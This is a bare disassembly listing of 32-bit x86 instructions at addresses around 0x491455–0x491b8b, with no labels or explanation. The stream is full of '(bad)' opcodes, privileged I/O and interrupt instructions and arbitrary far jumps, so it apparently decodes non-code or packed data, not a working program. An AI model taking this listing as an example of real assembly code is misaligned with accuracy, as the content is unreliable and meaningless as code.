  491455:	shl    cl,cl
  491457:	mov    edi,0xe46b2f37
  49145c:	enter  0xd582,0xcb
  491460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  491461:	inc    ebx
  491462:	add    eax,0xb7a51032
  491467:	inc    ebx
  491468:	xor    BYTE PTR [eax],cl
  49146a:	xchg   BYTE PTR [ebp-0x3abe9091],dh
  491470:	sub    bl,BYTE PTR [edx+0x7]
  491473:	mov    bh,0x37
  491475:	xor    BYTE PTR [ebp-0x7d],0x48
  491479:	ja     0x4914c2
  49147b:	or     DWORD PTR ds:0x5f97e75a,ebp
  491481:	xor    DWORD PTR ds:0x1722206b,ecx
  491487:	daa    
  491488:	add    DWORD PTR [ebx-0x102843bb],ebp
  49148e:	adc    al,0x5b
  491490:	xlat   BYTE PTR ds:[ebx]
  491491:	cmc    
  491492:	(bad)  
  491493:	xor    DWORD PTR [edi],edx
  491495:	xor    ecx,DWORD PTR [edi-0x40]
  491498:	nop
  491499:	mov    dh,BYTE PTR [edi]
  49149b:	cmp    DWORD PTR [ebx+0x2ae0f7f],esp
  4914a1:	fwait
  4914a2:	test   BYTE PTR [edi],dh
  4914a4:	rdtsc  
  4914a6:	pop    es
  4914a7:	stos   DWORD PTR es:[edi],eax
  4914a8:	test   cl,dh
  4914aa:	(bad)  
  4914ab:	pop    edi
  4914ac:	inc    edi
  4914ad:	mov    dh,0xb7
  4914af:	push   es
  4914b0:	adc    ch,BYTE PTR [edi]
  4914b2:	pop    edi
  4914b3:	daa    
  4914b4:	imul   esi,DWORD PTR [eax+0x1c],0xffffffc1
  4914b8:	ja     0x4914ee
  4914ba:	inc    edi
  4914bb:	test   ch,al
  4914bd:	sub    al,0xa5
  4914bf:	aas    
  4914c0:	scas   eax,DWORD PTR es:[edi]
  4914c1:	and    BYTE PTR [esi-0x7df0faa5],dh
  4914c7:	pop    edi
  4914c8:	mov    BYTE PTR [ebx+0x2f0f4d89],cl
  4914ce:	xor    ebp,DWORD PTR [esi+0x1]
  4914d1:	xchg   edi,eax
  4914d2:	cmp    BYTE PTR [edi-0x32],cl
  4914d5:	daa    
  4914d6:	xor    esi,DWORD PTR [esi+esi*8]
  4914d9:	lods   eax,DWORD PTR ds:[esi]
  4914da:	add    eax,DWORD PTR [ebp+0x57]
  4914dd:	push   DWORD PTR [edx+eax*1]
  4914e0:	imul   ebx,DWORD PTR [edx+0x2f],0xfffffff7
  4914e4:	inc    esi
  4914e5:	push   0xffffff93
  4914e7:	mov    BYTE PTR [edi+0x5d7026d7],dl
  4914ed:	aaa    
  4914ee:	ss out dx,eax
  4914f0:	xor    BYTE PTR ds:0x6f60994c,cl
  4914f6:	xor    ebx,DWORD PTR [edi+0x33]
  4914f9:	xchg   edx,eax
  4914fa:	nop
  4914fb:	cmp    BYTE PTR ds:0xa01a91ff,ch
  491501:	stos   DWORD PTR es:[edi],eax
  491502:	mov    bh,0x38
  491504:	aaa    
  491505:	jge    0x49154f
  491507:	imul   edx,DWORD PTR [edx+0x3888471f],0xffffffb8
  49150e:	and    eax,0x24d1379f
  491513:	add    ebp,DWORD PTR [ecx-0x4b8f98f9]
  491519:	stos   BYTE PTR es:[edi],al
  49151a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49151b:	movnti DWORD PTR [ebx+edx*1+0x58],edx
  491520:	xor    ecx,edi
  491522:	pop    es
  491523:	mov    ah,0x2a
  491525:	or     eax,0xc6352721
  49152a:	stos   BYTE PTR es:[edi],al
  49152b:	fwait
  49152c:	xchg   DWORD PTR [ecx],esi
  49152e:	push   ebx
  49152f:	outs   dx,BYTE PTR ds:[esi]
  491530:	push   ss
  491531:	in     eax,dx
  491532:	pop    eax
  491533:	adc    eax,DWORD PTR [edi+0x2b4917f7]
  491539:	test   BYTE PTR [esi],ch
  49153b:	imul   edi
  49153d:	add    ah,BYTE PTR [esi-0x4038cae0]
  491543:	xor    cl,BYTE PTR ds:0x578ab599
  491549:	ja     0x49155a
  49154b:	and    eax,0x476169b8
  491550:	pop    esp
  491551:	xchg   ebx,eax
  491552:	hlt    
  491553:	and    DWORD PTR [edi-0x11],edx
  491556:	inc    ebp
  491557:	pop    eax
  491558:	int    0xa2
  49155a:	xchg   edx,eax
  49155b:	scas   eax,DWORD PTR es:[edi]
  49155c:	adc    BYTE PTR [ebx+eax*4+0x5b],0xb7
  491561:	iret   
  491562:	add    dl,BYTE PTR [esi+0x5b]
  491565:	mov    bl,0xf
  491567:	aas    
  491568:	mov    eax,ds:0x676b016a
  49156d:	ja     0x491516
  49156f:	jne    0x4915c1
  491571:	push   ecx
  491572:	pop    ds
  491573:	aaa    
  491574:	mov    edi,0x5a13885c
  491579:	inc    edi
  49157a:	test   DWORD PTR [edx+ecx*2+0x5767bb0a],0x61351680
  491585:	dec    edi
  491586:	mov    ah,0x90
  491588:	sbb    BYTE PTR ds:0xc48117d7,al
  49158e:	call   0x33a4d527
  491593:	outs   dx,BYTE PTR ds:[esi]
  491594:	push   ebp
  491595:	aaa    
  491596:	data16 xlat BYTE PTR ds:[ebx]
  491598:	out    dx,eax
  491599:	sub    BYTE PTR [eax+0x64],al
  49159c:	call   0x34741cd7
  4915a1:	sbb    DWORD PTR [edi+0x37],esi
  4915a4:	inc    esi
  4915a5:	fild   WORD PTR [esi+edx*2]
  4915a8:	lods   eax,DWORD PTR ds:[esi]
  4915a9:	push   es
  4915aa:	pop    ds
  4915ab:	aaa    
  4915ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4915ad:	push   ss
  4915ae:	mov    eax,ds:0x46a7e7c3
  4915b3:	adc    ch,0x18
  4915b6:	mov    edx,0x43c7327f
  4915bb:	bound  esi,QWORD PTR [edx]
  4915bd:	icebp  
  4915be:	inc    edi
  4915bf:	scas   eax,DWORD PTR es:[edi]
  4915c0:	xchg   DWORD PTR [ecx],eax
  4915c2:	xchg   esp,eax
  4915c3:	xchg   BYTE PTR [eax+0xf],al
  4915c6:	out    0xd6,eax
  4915c8:	and    dl,BYTE PTR [eax-0x735590fa]
  4915ce:	mov    ds:0x6f362f82,eax
  4915d3:	jmp    0x2809eb40
  4915d8:	pop    edi
  4915d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4915da:	call   0x6538:0x370fe041
  4915e1:	or     al,0xcd
  4915e3:	adc    BYTE PTR [edi+0x31],dh
  4915e6:	dec    ecx
  4915e7:	stos   DWORD PTR es:[edi],eax
  4915e8:	and    eax,0x86774788
  4915ed:	arpl   WORD PTR [edx+eax*2-0x7b005cb1],sp
  4915f4:	test   DWORD PTR [edi],eax
  4915f6:	test   DWORD PTR [edi],ebx
  4915f8:	pop    ebp
  4915f9:	mov    ah,0x31
  4915fb:	loop   0x4915dc
  4915fd:	out    dx,eax
  4915fe:	ins    DWORD PTR es:[edi],dx
  4915ff:	fisttp DWORD PTR [esi]
  491601:	popa   
  491602:	scas   eax,DWORD PTR es:[edi]
  491603:	setnp  BYTE PTR [esi-0x4f]
  491607:	call   0x4d08:0x624ff74c
  49160e:	xor    bh,BYTE PTR [edi-0x7d5a7619]
  491614:	gs inc ebx
  491616:	mov    edi,0x4a0c011f
  49161b:	sbb    DWORD PTR [edi+0x3046be1],edi
  491621:	sub    DWORD PTR [si-0x2f4c],0x6c
  491627:	pop    ss
  491628:	(bad)  
  491629:	fild   DWORD PTR [eax]
  49162b:	or     BYTE PTR cs:[edi],bh
  49162e:	xor    ecx,DWORD PTR [eax+0x2fa91275]
  491634:	(bad)  
  491635:	push   edi
  491636:	or     eax,0xd7dfa82c
  49163b:	inc    ebp
  49163c:	dec    ecx
  49163d:	lods   eax,DWORD PTR ds:[esi]
  49163e:	and    al,BYTE PTR [eax]
  491640:	daa    
  491641:	push   ebx
  491642:	inc    esp
  491643:	(bad)  
  491644:	les    edi,FWORD PTR [edi+0x34303f41]
  49164a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49164b:	add    cl,BYTE PTR [ebx]
  49164d:	inc    edi
  49164e:	rsm    
  491650:	lods   al,BYTE PTR ds:[esi]
  491651:	and    eax,0x774347b3
  491656:	sub    al,0x6a
  491658:	push   0xffffffed
  49165a:	inc    ebx
  49165b:	pop    ss
  49165c:	aas    
  49165d:	mov    eax,ds:0xdf44bab5
  491662:	pop    edi
  491663:	mov    ds:0x9f58ac09,eax
  491668:	scas   eax,DWORD PTR es:[edi]
  491669:	test   eax,0x30a4d610
  49166e:	not    DWORD PTR [esi+0x4715bdb1]
  491674:	xor    edx,DWORD PTR [edi]
  491676:	stos   DWORD PTR es:[edi],eax
  491677:	test   DWORD PTR [eax+0x28],edx
  49167a:	lahf   
  49167b:	xchg   edi,edi
  49167d:	arpl   WORD PTR [edx+0x368f88a2],bp
  491683:	test   al,0x41
  491685:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  491686:	push   0x6f
  491688:	test   DWORD PTR [ecx],0x38b86ac0
  49168e:	inc    edi
  49168f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  491690:	mov    al,ds:0x6727ab45
  491695:	pop    eax
  491696:	and    eax,0xd7d32c40
  49169b:	dec    edi
  49169c:	or     bl,ah
  49169e:	sub    BYTE PTR [edi+0x45],dl
  4916a1:	div    DWORD PTR [edi]
  4916a3:	add    BYTE PTR [ecx],dh
  4916a5:	aam    0xd6
  4916a7:	mov    WORD PTR [edi+eax*8],fs
  4916aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4916ab:	jmp    0x187f:0x7f830804
  4916b2:	aad    0xa
  4916b4:	jecxz  0x4916ee
  4916b6:	jg     0x4916cf
  4916b8:	cmp    dl,BYTE PTR [edx]
  4916ba:	and    DWORD PTR [eax-0x76],esi
  4916bd:	daa    
  4916be:	pop    ds
  4916bf:	mov    cs,WORD PTR [esi-0x20082bfb]
  4916c5:	xor    BYTE PTR [edi+ebp*2],al
  4916c8:	adc    eax,0x576f674b
  4916cd:	mov    edi,DWORD PTR [eax-0x55]
  4916d0:	lods   al,BYTE PTR ds:[esi]
  4916d1:	out    dx,eax
  4916d2:	call   FWORD PTR [ecx+0x6f89a5ba]
  4916d8:	inc    esi
  4916d9:	xlat   BYTE PTR ds:[ebx]
  4916da:	xor    ah,BYTE PTR [eax-0x54]
  4916dd:	loopne 0x491728
  4916df:	cmova  ecx,DWORD PTR [ecx-0x20]
  4916e3:	mov    al,0x9a
  4916e5:	bts    DWORD PTR ss:[di+0x1798],eax
  4916ec:	mov    bh,0x5b
  4916ee:	adc    BYTE PTR [ebp-0x5048939a],dl
  4916f4:	inc    esi
  4916f5:	bound  ebx,QWORD PTR [ebp+0x6b]
  4916f8:	iret   
  4916f9:	das    
  4916fa:	inc    edi
  4916fb:	adc    cl,BYTE PTR [edx+eax*1-0x5a]
  4916ff:	inc    esi
  491700:	outs   dx,DWORD PTR ds:[esi]
  491701:	sbb    eax,DWORD PTR [ebp-0x8ac6a2a]
  491707:	aas    
  491708:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  491709:	push   es
  49170a:	or     eax,DWORD PTR [ebx]
  49170c:	inc    esp
  49170d:	das    
  49170e:	xchg   edx,eax
  49170f:	and    edi,DWORD PTR [eax+0x452f0716]
  491715:	mov    WORD PTR ss:[ebx],es
  491718:	mov    al,0x2a
  49171a:	test   ch,dl
  49171c:	mov    ch,0xa8
  49171e:	mov    edi,0x6855a42f
  491723:	mov    ds:0xde37b777,al
  491728:	adc    ecx,DWORD PTR es:[ebx+0xb6c579b]
  49172f:	popf   
  491730:	xor    dl,BYTE PTR [edi+0x180677b3]
  491736:	imul   edx,DWORD PTR [edi],0x38
  491739:	inc    edi
  49173b:	push   ebp
  49173c:	pop    eax
  49173d:	add    eax,0x90a737b5
  491742:	mov    al,0x2a
  491744:	(bad)  
  491745:	fistp  WORD PTR [edx]
  491747:	test   eax,0x5aaf6ad5
  49174c:	ja     0x491707
  49174e:	add    bh,BYTE PTR [esp+eax*4]
  491751:	shl    DWORD PTR [edi-0x3f9ca5ba],cl
  491757:	or     cl,BYTE PTR [edi-0x7f]
  49175a:	pop    eax
  49175b:	or     al,0x62
  49175d:	aas    
  49175e:	cli    
  49175f:	ror    BYTE PTR [edx+0x3b7e8ee],1
  491765:	(bad)  
  491766:	daa    
  491767:	or     BYTE PTR [ecx-0x37],ah
  49176a:	aad    0x6f
  49176c:	xor    BYTE PTR [ecx+0x5a],dl
  49176f:	dec    ebx
  491770:	mov    cl,dh
  491772:	xor    bh,dl
  491774:	outs   dx,DWORD PTR ds:[esi]
  491775:	mov    WORD PTR [edx+0x3a3ecb48],ds
  49177b:	pusha  
  49177c:	and    BYTE PTR ds:0x445b3f1f,bl
  491782:	es mov cl,0xf
  491785:	aaa    
  491786:	mov    cl,0xc0
  491788:	les    esi,FWORD PTR [esi]
  49178a:	cmp    bh,dl
  49178c:	outs   dx,DWORD PTR ds:[esi]
  49178d:	retf   
  49178e:	lods   eax,DWORD PTR ds:[esi]
  491790:	(bad)  
  491791:	out    dx,eax
  491792:	out    dx,eax
  491793:	sub    edi,DWORD PTR [edi-0x37]
  491796:	shr    BYTE PTR [edx],cl
  491798:	push   0x2c2cd2c7
  49179d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49179e:	push   cs
  49179f:	inc    edx
  4917a0:	push   ds
  4917a1:	inc    ebp
  4917a2:	stos   DWORD PTR es:[edi],eax
  4917a3:	push   0x1b
  4917a5:	pop    eax
  4917a6:	das    
  4917a7:	test   DWORD PTR [edi+0x44e70083],eax
  4917ad:	out    0x83,eax
  4917af:	mov    al,ds:0x8aa7b75b
  4917b4:	push   edi
  4917b5:	popa   
  4917b6:	xchg   ebp,eax
  4917b7:	mov    ss,WORD PTR [edi+ecx*4]
  4917ba:	and    ebx,DWORD PTR es:[eax]
  4917bd:	push   ss
  4917be:	lods   al,BYTE PTR ds:[esi]
  4917bf:	mov    bh,0x7
  4917c1:	(bad)  
  4917c2:	push   esi
  4917c3:	daa    
  4917c4:	push   ss
  4917c5:	add    edi,ebp
  4917c7:	aaa    
  4917c8:	pop    eax
  4917c9:	repnz jecxz 0x4917d8
  4917cc:	(bad)  [edx]
  4917ce:	mov    bh,0x41
  4917d0:	inc    edx
  4917d1:	call   0xbfd0642e
  4917d6:	or     ch,BYTE PTR [esi+0x55]
  4917d9:	sbb    eax,DWORD PTR [edi+0x6e]
  4917dc:	push   edi
  4917dd:	lds    ebp,FWORD PTR [eax+0x7363162]
  4917e3:	xchg   edi,eax
  4917e4:	je     0x4917a6
  4917e6:	icebp  
  4917e7:	push   edx
  4917e8:	pop    edi
  4917e9:	pop    DWORD PTR [ecx-0x28]
  4917ec:	inc    edx
  4917ed:	jmp    0x11d8:0xe7491fa4
  4917f4:	xchg   DWORD PTR [edi],esi
  4917f6:	outs   dx,DWORD PTR ds:[esi]
  4917f7:	xor    eax,0x2ab1a8b4
  4917fc:	xlat   BYTE PTR ds:[ebx]
  4917fd:	out    dx,eax
  4917fe:	int3   
  4917ff:	push   edx
  491800:	shl    DWORD PTR [ebp+0x311377b7],cl
  491806:	sub    DWORD PTR [eax+edi*1+0x69],esp
  49180a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49180b:	inc    ebx
  49180c:	push   es
  49180d:	jmp    0x401058bf
  491812:	test   ecx,0xf6976d0e
  491818:	daa    
  491819:	aas    
  49181a:	dec    BYTE PTR [eax+0x784b504]
  491820:	pop    eax
  491821:	(bad)  
  491822:	sub    al,BYTE PTR [edi+ebx*1-0x4fb42f37]
  491829:	scas   eax,DWORD PTR es:[edi]
  49182a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49182b:	outs   dx,DWORD PTR ds:[esi]
  49182c:	xchg   esp,eax
  49182d:	call   0x539d:0xd783e169
  491834:	in     al,0x1a
  491836:	iret   
  491837:	xor    BYTE PTR [ebx-0x1a],dh
  49183a:	or     edx,edx
  49183c:	mov    edx,0x146a5f40
  491841:	pusha  
  491842:	mov    BYTE PTR [edi],ah
  491844:	inc    ebx
  491845:	test   DWORD PTR [ebp+0x30],0x7fff6ab0
  49184c:	add    BYTE PTR [esi+ebp*2+0x1444df60],cl
  491853:	push   ss
  491854:	mov    eax,ds:0x36c075f
  491859:	sub    DWORD PTR [eax-0x7a],ebx
  49185c:	xor    edx,DWORD PTR [edi]
  49185e:	pop    eax
  49185f:	jo     0x49188c
  491861:	or     eax,0xe9471657
  491866:	mov    ds:0xc68f9d06,al
  49186b:	ss xor eax,0x3f210568
  491871:	iret   
  491872:	mov    ds:0xf84a161,eax
  491877:	dec    edi
  491878:	push   esp
  491879:	push   0x3f5742ab
  49187e:	inc    edi
  49187f:	or     esp,esp
  491881:	mov    DWORD PTR [esi+0x36],eax
  491884:	pop    ds
  491885:	ror    BYTE PTR [edx],1
  491887:	jbe    0x491894
  491889:	pop    ss
  49188a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49188b:	adc    DWORD PTR gs:[edi],esi
  49188e:	sbb    BYTE PTR [ebx+0x46],0x1a
  491892:	inc    eax
  491893:	dec    ebp
  491894:	inc    eax
  491895:	mov    edi,0x2d0bff34
  49189a:	test   BYTE PTR [esi+0x63a177df],dl
  4918a0:	push   ebp
  4918a1:	push   edx
  4918a2:	outs   dx,DWORD PTR ds:[esi]
  4918a3:	pop    edi
  4918a4:	push   cs
  4918a5:	pop    ecx
  4918a6:	mov    ecx,DWORD PTR [eax+0x57]
  4918a9:	inc    edi
  4918aa:	test   eax,0x372e3042
  4918af:	out    dx,eax
  4918b0:	fidivr WORD PTR [edx]
  4918b2:	mov    DWORD PTR ds:0x6103af9f,eax
  4918b8:	jo     0x49186a
  4918ba:	mov    edx,0xab83b74f
  4918bf:	dec    edx
  4918c0:	xor    dh,dl
  4918c2:	ja     0x4918e3
  4918c4:	imul   eax,DWORD PTR [esi+esi*2],0x10
  4918c8:	test   DWORD PTR [edi+0x50222100],0x2c6c565f
  4918d2:	dec    edx
  4918d3:	aaa    
  4918d4:	punpckhbw mm0,QWORD PTR [ebp-0xb0e3ca]
  4918db:	lds    eax,FWORD PTR [esi-0x54]
  4918de:	push   es
  4918df:	outs   dx,DWORD PTR ds:[esi]
  4918e0:	xchg   DWORD PTR [esi-0x56daa9ee],ebx
  4918e6:	scas   eax,DWORD PTR es:[edi]
  4918e7:	xchg   edx,eax
  4918e8:	jo     0x491893
  4918ea:	pop    eax
  4918eb:	das    
  4918ec:	stos   BYTE PTR es:[edi],al
  4918ed:	xchg   esp,eax
  4918ee:	test   al,0x9
  4918f0:	in     al,dx
  4918f1:	dec    edi
  4918f2:	xchg   edi,eax
  4918f3:	xor    BYTE PTR [esp+ebp*1-0x48],bh
  4918f7:	daa    
  4918f8:	dec    edi
  4918f9:	ja     0x491955
  4918fb:	sbb    eax,DWORD PTR [edx+ebx*2-0x7396b859]
  491902:	add    bh,BYTE PTR [ebx+ebp*2]
  491905:	inc    ecx
  491906:	inc    edi
  491907:	mov    dh,0x11
  491909:	bound  ebx,QWORD PTR [ebx+0x5c65979f]
  49190f:	sbb    ebp,DWORD PTR [ebx]
  491911:	push   edi
  491912:	xchg   ebx,eax
  491913:	adc    eax,0xd7188d76
  491918:	mul    DWORD PTR [edi+0x1a]
  49191b:	push   ss
  49191c:	lods   al,BYTE PTR ds:[esi]
  49191d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49191e:	cmp    BYTE PTR [edi-0x77eb52f1],al
  491924:	pop    ss
  491925:	fistp  DWORD PTR [ebx+0x56]
  491928:	xchg   esp,eax
  491929:	call   0x3c16:0xb4679740
  491930:	xlat   BYTE PTR ds:[ebx]
  491932:	push   ss
  491933:	das    
  491934:	sub    eax,0xd705bde1
  491939:	daa    
  49193a:	xchg   DWORD PTR [esi+0x60],ebp
  49193d:	inc    edx
  49193e:	push   cs
  49193f:	dec    esi
  491940:	xor    DWORD PTR [eax],edi
  491942:	pop    ds
  491943:	aad    0x40
  491945:	or     DWORD PTR [ecx],ebp
  491947:	push   edi
  491948:	or     BYTE PTR [ebx+0x6],cl
  49194b:	stos   BYTE PTR es:[edi],al
  49194c:	xlat   BYTE PTR ds:[ebx]
  49194d:	xor    BYTE PTR [eax],dh
  49194f:	or     al,BYTE PTR [ecx]
  491951:	mov    ds:0x18613f87,eax
  491956:	imul   edx,DWORD PTR [edx],0x7f
  491959:	jno    0x491966
  49195b:	pop    edx
  49195c:	repnz fidivr WORD PTR [eax]
  49195f:	jg     0x4919c6
  491961:	sbb    eax,0x339f489d
  491966:	sub    ecx,DWORD PTR [edx]
  491968:	add    eax,0xb5bf073a
  49196d:	mov    al,0x64
  49196f:	bound  esi,QWORD PTR [edi]
  491971:	cmp    BYTE PTR [edi+0x5d22a606],al
  491977:	xor    DWORD PTR [edi],ebx
  491979:	xor    BYTE PTR [ecx],dh
  49197b:	mov    al,BYTE PTR [eax+ebp*1-0x61]
  49197f:	aas    
  491980:	ins    BYTE PTR es:[edi],dx
  491981:	sbb    eax,0x3937585c
  491986:	inc    edi
  491987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  491988:	add    ah,0x37
  49198b:	out    0x43,eax
  49198d:	pop    ebx
  49198e:	or     al,0x47
  491990:	arpl   di,si
  491992:	outs   dx,DWORD PTR ds:[esi]
  491993:	aas    
  491994:	fwait
  491995:	sub    BYTE PTR [eax+0x28],al
  491998:	shl    bh,cl
  49199a:	dec    edi
  49199b:	shr    dl,0xb0
  49199e:	adc    eax,0xe2a30ddf
  4919a3:	mov    al,ds:0x2767393f
  4919a8:	int    0xd6
  4919aa:	stos   BYTE PTR es:[edi],al
  4919ab:	sub    BYTE PTR [edi-0x3d65768d],0x20
  4919b2:	xchg   BYTE PTR [edi-0x20],dh
  4919b5:	sbb    al,BYTE PTR [esi-0x30cf28a0]
  4919bb:	inc    ebx
  4919bc:	and    DWORD PTR [eax],0xff672cc4
  4919c2:	and    DWORD PTR ds:0xe734ad8a,edx
  4919c8:	scas   eax,DWORD PTR es:[edi]
  4919c9:	jno    0x491a2e
  4919cb:	aad    0x58
  4919cd:	mov    bh,0x7f
  4919cf:	cmp    BYTE PTR [edx],al
  4919d1:	and    al,0x5f
  4919d3:	aaa    
  4919d4:	add    BYTE PTR [edx],dh
  4919d6:	xadd   DWORD PTR [edx+0x7f316741],ecx
  4919dd:	pop    es
  4919de:	es pop es
  4919e0:	pop    ebp
  4919e1:	dec    edx
  4919e2:	scas   eax,DWORD PTR es:[edi]
  4919e3:	aaa    
  4919e4:	xor    al,0x28
  4919e6:	adc    eax,0xac7f7f37
  4919eb:	push   cs
  4919ec:	inc    ebx
  4919ed:	pop    eax
  4919ee:	test   DWORD PTR [eax],0x7f5420e2
  4919f4:	xchg   edi,eax
  4919f5:	xchg   ebx,eax
  4919f6:	imul   ebx,DWORD PTR [eax+0x6738f72a],0x39
  4919fd:	sbb    BYTE PTR [ebx+0xa],0xd
  491a01:	out    dx,eax
  491a02:	lahf   
  491a03:	sbb    DWORD PTR [ebx-0x7be02dee],ebp
  491a09:	xor    eax,0x3346c26d
  491a0e:	xlat   BYTE PTR ds:[ebx]
  491a0f:	pop    edx
  491a10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  491a11:	ins    DWORD PTR es:[edi],dx
  491a12:	mov    bl,0xf7
  491a14:	shl    DWORD PTR [edi],cl
  491a16:	inc    edx
  491a17:	pop    esp
  491a18:	jno    0x491a65
  491a1a:	xchg   edi,eax
  491a1b:	inc    ecx
  491a1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  491a1d:	adc    cl,BYTE PTR [ebx+0x3a]
  491a20:	test   BYTE PTR [edi],dl
  491a22:	xor    DWORD PTR [ebx+0x67405616],edx
  491a28:	jo     0x4919b5
  491a2a:	push   eax
  491a2b:	mov    eax,DWORD PTR [edi+0x112eeae7]
  491a31:	stos   DWORD PTR es:[edi],eax
  491a32:	test   BYTE PTR [edi],al
  491a34:	xchg   DWORD PTR [esi-0x53],edx
  491a37:	push   ecx
  491a38:	mov    al,0xb7
  491a3a:	aas    
  491a3b:	adc    DWORD PTR [ebx+0x46e73051],ecx
  491a41:	mov    eax,ds:0xcf8f1c00
  491a46:	or     eax,0x47014232
  491a4b:	(bad)  
  491a4e:	(bad)  [esi+esi*1+0x1b]
  491a52:	daa    
  491a53:	xchg   BYTE PTR ds:0xc376,bl
  491a58:	daa    
  491a59:	xchg   ebx,eax
  491a5a:	mov    dh,0xb5
  491a5c:	dec    eax
  491a5d:	clc    
  491a5e:	xchg   ebx,eax
  491a5f:	xchg   edi,eax
  491a60:	or     ah,BYTE PTR [ebp*1-0x20be51d7]
  491a67:	adc    eax,0x4fdf2620
  491a6c:	inc    esi
  491a6d:	jg     0x491aa4
  491a6f:	call   0x393cc77c
  491a74:	iret   
  491a75:	adc    eax,0x978e3575
  491a7a:	rcl    DWORD PTR [edi+0x6],cl
  491a7d:	push   edx
  491a7e:	or     BYTE PTR [edx-0x49],ah
  491a81:	push   ds
  491a82:	add    ecx,DWORD PTR [ebx+0x3397d74a]
  491a88:	mov    ds:0xfa542e1,eax
  491a8d:	xchg   esi,eax
  491a8e:	aaa    
  491a8f:	or     ecx,DWORD PTR [esi+esi*1+0x763274b]
  491a96:	pop    ebx
  491a97:	xor    al,0x56
  491a99:	push   ecx
  491a9a:	ret    
  491a9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  491a9c:	xor    DWORD PTR [ebx-0x77],0x375e6fbf
  491aa3:	outs   dx,BYTE PTR ds:[esi]
  491aa4:	add    al,0x0
  491aa6:	push   edx
  491aa7:	xlat   BYTE PTR ds:[ebx]
  491aa8:	jp     0x491a85
  491aaa:	mov    al,0x88
  491aac:	fadd   DWORD PTR [edi]
  491aae:	dec    edi
  491aaf:	mov    ebx,0xc0cb75c8
  491ab5:	dec    edi
  491ab6:	aaa    
  491ab7:	push   eax
  491ab8:	call   0x558:0x7f1fbc40
  491abf:	es iret 
  491ac1:	out    dx,al
  491ac2:	xor    BYTE PTR [edi-0x5b],dl
  491ac5:	add    al,BYTE PTR fs:[ebx-0x59]
  491ac9:	xor    ch,BYTE PTR [eax+ebx*1]
  491acc:	sbb    eax,DWORD PTR [eax]
  491ace:	pop    ss
  491acf:	fwait
  491ad0:	or     BYTE PTR [eax-0x2b],ch
  491ad3:	fisttp WORD PTR [ebx]
  491ad5:	mov    esp,0x5f4712a9
  491ada:	test   DWORD PTR [ebx+0x57],0x4d050634
  491ae1:	mov    edi,0xe2c2eb02
  491ae6:	pop    es
  491ae7:	out    dx,eax
  491ae8:	jl     0x491a96
  491aea:	inc    eax
  491aeb:	mov    edx,DWORD PTR [edi]
  491aed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  491aee:	adc    eax,DWORD PTR [eax-0x38dfc8ab]
  491af4:	dec    eax
  491af5:	repnz lods eax,DWORD PTR ds:[esi]
  491af7:	push   ebp
  491af8:	jg     0x491ac8
  491afa:	xor    eax,0x34a2e23
  491aff:	addr16 inc esp
  491b01:	addr16 dec eax
  491b03:	mov    esp,DWORD PTR [ebx+edx*1]
  491b06:	xor    al,0x8a
  491b08:	xor    al,0x6e
  491b0a:	pop    eax
  491b0b:	mov    eax,ds:0x41d7279f
  491b10:	push   0x3117df83
  491b15:	mov    al,0x2b
  491b17:	add    al,0xf
  491b19:	sub    esp,DWORD PTR [edi-0x27573da9]
  491b1f:	inc    esi
  491b20:	xlat   BYTE PTR ds:[ebx]
  491b21:	daa    
  491b22:	pop    ss
  491b23:	pop    esi
  491b24:	dec    eax
  491b25:	stos   DWORD PTR es:[edi],eax
  491b26:	dec    eax
  491b27:	inc    edi
  491b28:	lahf   
  491b29:	xor    al,BYTE PTR [eax+ecx*4+0x52]
  491b2d:	and    BYTE PTR [edi+0x238584a9],ah
  491b33:	pop    ds
  491b34:	inc    ebx
  491b35:	outs   dx,DWORD PTR ds:[esi]
  491b36:	imul   edx,DWORD PTR [ebp+0x46],0x62
  491b3a:	pop    edi
  491b3b:	pop    ss
  491b3c:	(bad)  
  491b3d:	sub    dl,dl
  491b3f:	push   cs
  491b40:	ret    
  491b41:	out    0xc6,eax
  491b43:	dec    eax
  491b44:	sub    cx,WORD PTR [edi+0x68e37c7]
  491b4b:	mov    cl,0xce
  491b4d:	xchg   edx,eax
  491b4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  491b4f:	mov    edx,cr0
  491b52:	test   DWORD PTR [eax],edx
  491b54:	ja     0x491ba6
  491b56:	lods   al,BYTE PTR ds:[esi]
  491b57:	lods   eax,DWORD PTR ds:[esi]
  491b58:	mov    BYTE PTR [edi+0x77],bl
  491b5b:	pop    ss
  491b5c:	inc    edx
  491b5d:	xchg   ebp,eax
  491b5e:	mov    dl,0x70
  491b60:	xor    al,0xaf
  491b62:	in     al,0xa8
  491b64:	adc    BYTE PTR [esi],dl
  491b66:	jg     0x491b9c
  491b68:	mov    ch,0x56
  491b6a:	add    BYTE PTR [edi+eax*4],ah
  491b6d:	lahf   
  491b6e:	push   ebx
  491b6f:	pop    eax
  491b70:	jno    0x491bdc
  491b72:	pop    ss
  491b73:	cmp    cl,BYTE PTR [edx]
  491b75:	mov    WORD PTR [esi-0x61],fs
  491b78:	inc    ebx
  491b79:	cmp    DWORD PTR [edx+0xc],ecx
  491b7c:	je     0x491b41
  491b7e:	iret   
  491b7f:	cmp    bh,dl
  491b81:	push   ebx
  491b82:	stos   DWORD PTR es:[edi],eax
  491b83:	adc    BYTE PTR [ecx],ch
  491b85:	inc    DWORD PTR [esi]
  491b87:	add    ah,BYTE PTR [ebx]
  491b89:	push   0xffffffa7
  491b8b:	pop    ds
